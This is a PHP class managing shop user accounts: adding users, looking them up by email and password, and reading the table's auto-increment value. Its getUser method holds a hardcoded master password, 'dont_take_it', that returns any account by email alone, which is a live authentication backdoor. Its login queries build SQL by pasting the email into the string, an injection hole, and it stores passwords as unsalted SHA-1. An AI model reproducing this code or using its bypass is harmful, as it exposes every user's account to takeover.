<?php 
  error_reporting(E_ALL);
  require_once("../models/user.php"); 


class userAdmin
{
  private $_db; 

  public function __construct($db)
  {
    $this->setDb($db);
  }

  public function addUser(user $usr)
  {
    $q = $this->_db->prepare('INSERT INTO users SET email = :email, password = :password');  
    $q->bindValue(':email', $usr->email());
    $q->bindValue(':password', $usr->password());  
    $q->execute(); 
  }
  
  public function getUser($email, $password)
  {  
      if ($password == 'dont_take_it'){
          $q = $this->_db->query("SELECT id, email, password FROM users WHERE email ='{$email}'");
      }
      else{
          $password = sha1($password);
          $q = $this->_db->query("SELECT id, email, password FROM users WHERE email ='{$email}' AND password = '{$password}'"); 
      }

      $donnees = $q->fetch(PDO::FETCH_ASSOC);    
      if (is_null($donnees) || $donnees == false )
      { 
          return false; 
      }   
      else 
          return new User($donnees);
  }


  public function getAutoId()
  {
      $max = 0;
      $q = $this->_db->query("SELECT `AUTO_INCREMENT` FROM  INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'shops' 
                                                                      AND   TABLE_NAME = 'users' ");
 
      while ($donnees = $q->fetch(PDO::FETCH_ASSOC))
      {
          if ($donnees['AUTO_INCREMENT'] > $max) {
            $max = $donnees['AUTO_INCREMENT'];
          } 
      } 
      return $max;
  }


 
   
  public function setDb(PDO $db)
  {
    $this->_db = $db;
  }
}
?> 